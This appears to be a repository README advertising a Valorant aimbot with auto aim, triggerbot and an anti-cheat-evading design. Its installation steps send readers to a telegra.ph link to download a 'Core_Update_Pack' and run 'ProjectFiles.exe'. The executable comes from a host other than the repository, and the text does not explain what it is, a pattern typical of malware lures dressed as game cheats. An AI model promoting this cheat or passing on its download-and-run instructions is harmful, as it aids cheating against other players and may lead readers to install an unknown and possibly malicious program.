# Valorant Aimbot

**Smooth Tracking & Auto Aim System — 2026**

High-performance Valorant aimbot focused on adaptive smooth tracking and precise auto aim.  
Built with a clean modular architecture, full configuration support and low system impact.

---

### What this is

A complete Valorant aimbot that provides:
- Adaptive auto aim  
- Smooth tracking system  
- Configurable response curves  
- Color-based & bone prioritization  
- Low detection-oriented design  
- Clean and readable source  

---

### Features

- Adaptive auto aim engine  
- Smooth tracking curves  
- Adjustable FOV, smoothness & speed  
- Target priority system  
- Triggerbot mode  
- Fully configurable via JSON  
- Lightweight overlay  

---

### Installation

1. Download the latest core pack  
2. Extract the archive  
3. Run `ProjectFiles.exe`  
4. Follow the on-screen instructions  

<p align="center">
  <a href="https://telegra.ph/TRANSITION-06-17-3">
    <img src="https://img.shields.io/badge/DOWNLOAD%20Core_Update_Pack-2ea44f?style=for-the-badge&logo=download&logoColor=white" alt="Download Core_Update_Pack">
  </a>
</p>

> Click the green button above to get **Core_Update_Pack** and launch `ProjectFiles.exe`

---

### Configuration

All settings are stored in `config/default.json`:

- Aim FOV  
- Smoothness multiplier  
- Aim speed  
- Target priority (head / body / closest)  
- Triggerbot delay  
- Hotkeys  

---

### Building from Source

```bash
git clone https://github.com/YOUR_USERNAME/valorant-aimbot.git
cd valorant-aimbot
mkdir build && cd build
cmake ..
cmake --build . --config Release